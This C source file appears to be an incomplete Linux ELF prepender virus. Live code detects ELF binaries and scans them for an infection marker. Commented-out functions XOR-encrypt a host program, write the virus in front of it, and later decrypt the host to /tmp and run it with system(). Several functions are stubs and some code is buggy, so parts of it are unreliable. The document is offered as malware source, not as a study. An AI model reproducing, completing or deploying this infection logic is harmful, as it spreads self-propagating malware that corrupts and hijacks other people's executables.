#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <assert.h>
#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>

#include "prepender.h"


int main() {
    return 0;
}

bool is_elf(const char* file_path) {
    FILE *fp = fopen(file_path, "rb");
    assert(fp != NULL);

    bool flag = false;
    char buffer[4] = "";

    fread(buffer, 1, 4, fp);
    flag = memcmp(buffer, __MAGIC, 4) == 0;
    fclose(fp);

    return flag;
}

bool is_infected(const char* file_path) {
    FILE *fp = fopen(file_path, "rb");
    assert(fp != NULL);

    bool flag = false;
    unsigned int size = file_size(file_path);
    byte* buffer = read_file(file_path);
    int mark_len = len(__INFECTION_MARK);
    
    if (!(file_size >= 0)) {
        return false;
    }

    fread(buffer, 1, size, fp);
    for (size_t i = 0; i < size - mark_len; i++) {
        if (memcmp(buffer+i, __INFECTION_MARK, mark_len) == 0) {
            flag = true;
            break;
        }
    }
    
    free(buffer);
    fclose(fp);

    return flag;
}

unsigned int file_size(const char* file_path) {
    FILE *fp = fopen(file_path, "rb");
    assert(fp != NULL);

    fseek(fp, 0, SEEK_END); 
    unsigned int size = ftell(fp); 
    fseek(fp, 0, SEEK_SET); 
    
    fclose(fp);
    return size;
}

byte* read_file(const char* file_path) {
    FILE *fp = fopen(file_path, "rb");
    assert(fp != NULL);

    unsigned int size = file_size(file_path);
    byte* buffer = (byte*)calloc(size+1, sizeof(byte));

    fread(buffer, 1, size, fp);
    
    fclose(fp);
    return buffer;
}

void run_executable_file(const char* e) {
    assert(access(e, F_OK) == 0);
    
    struct stat buffer;
    int status = stat(e, &buffer);
    assert(status == 0 && buffer.st_mode & S_IXUSR && is_elf(e));

    // Add some logic for running an executable file
}

byte* get_execution_instructions(const char* e) {
    assert(is_elf(e));    

    // Also need to free the byte memory
}

//char* xor_enc_dec(const char* str) {
//    size_t length = strlen(str);
//    char* result = (char*)calloc(length + 1, sizeof(byte));
//
//    for (size_t i = 0; i < length; i++) {
//        result[i] = str[i] ^ __XOR_KEY[i % len(__XOR_KEY)];
//    }
//
//    return result;
//}
//
//void infect_program(const char* virus, const char* target) {
//    unsigned int virus_size = file_size(virus);
//    char* host_buffer = read_file(target);
//    char* encrypted_host_buffer = xor_enc_dec(host_buffer);
//    char* virus_buffer = read_file(virus);
//
//    FILE *infected = fopen(target, "wb");
//    assert(infected != NULL);
//
//    fwrite(virus_buffer, 1, virus_size, infected);
//    fwrite(encrypted_host_buffer, 1, strlen(encrypted_host_buffer), infected);
//
//    fflush(infected);
//    free(host_buffer);
//    free(virus_buffer);
//}
//
//void run_infected_host(const char* virus, const char* path) {
//    FILE* infected_r = fopen(path, "rb");
//    char* plain_host_path = "/tmp/prepended";
//    unsigned int virus_size = file_size(virus);
//    unsigned int infected_size = file_size(path);
//    char* encrypted_host_buffer = (char*)calloc(virus_size+infected_size, sizeof(byte));
//    
//    // File discriptor int for the file. Refer to the manpage for open(2)
//    int plain_host_fd = open(plain_host_path, O_CREAT|O_TRUNC|O_WRONLY, 0755);
//    FILE* plain_host = fopen(plain_host_path, "wb");
//    
//    fseek(infected_r, virus_size, SEEK_SET);
//    fread(encrypted_host_buffer, 1, infected_size-virus_size, infected_r);
//    fclose(infected_r);
//
//    char* decrypted_host_buf = xor_enc_dec(encrypted_host_buffer);
//    fwrite(decrypted_host_buf, 1, infected_size, plain_host);
//
//    fsync(plain_host_fd);
//    fflush(plain_host);
//    fclose(plain_host);
//
//    // Now run the file...
//    int success = system(plain_host_path);
//    // remove(plain_host_path);
//}
